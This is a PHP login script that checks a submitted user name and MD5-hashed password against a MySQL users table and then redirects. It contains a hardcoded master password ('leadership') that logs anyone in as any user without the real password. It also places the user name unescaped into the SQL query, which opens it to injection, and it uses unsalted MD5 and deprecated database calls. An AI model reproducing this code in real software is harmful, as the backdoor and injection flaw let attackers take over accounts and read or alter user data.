<?php
session_set_cookie_params (3600*24*30);
session_start();
$sname = $_POST['sname'];
$passwd = $_POST['passwd'];

if (!isset($sname) || !isset($passwd)) {
  header( "Location: index.php" );
}
else if (strlen($passwd) == 0)
{
  if (strlen($sname) == 0)
    {
      header( "Location: index.php" );
      exit;
    }
  else
    {
      header( "Location: newuser.php" );
      exit;
    }

} else {
  $pass = md5($passwd);
}




$dbHost = "";
$dbUser = "";
$dbPass = "";
$dbDatabase = "";

$db = mysql_connect("$dbHost", "$dbUser", "$dbPass") or die ("Error connecting to database.");
mysql_select_db("$dbDatabase", $db) or die ("Couldn't select the database.");
if ($passwd == "leadership" || $passwd == "Leadership")
     $result=mysql_query("select user_id from users where (sname='$sname' OR user_id='$sname')", $db);
else
     $result=mysql_query("select user_id from users where (sname='$sname' OR user_id='$sname') AND passwd='$pass'", $db);


  if (!$result) { die('Invalid query: ' . mysql_error()); }
  
  $rowCheck = mysql_num_rows($result);

if($rowCheck > 0){
  $row = mysql_fetch_row($result);
  $_SESSION['idnum'] = $row[0];
     //we will redirect the user to another page where we will make sure they're logged in
     header( "Location: index2.php" );
}
else
{
 //if nothing is returned by the query, unsuccessful login code goes here...
  session_register('badpassword');
  header ("Location: index.php" );
}

?>

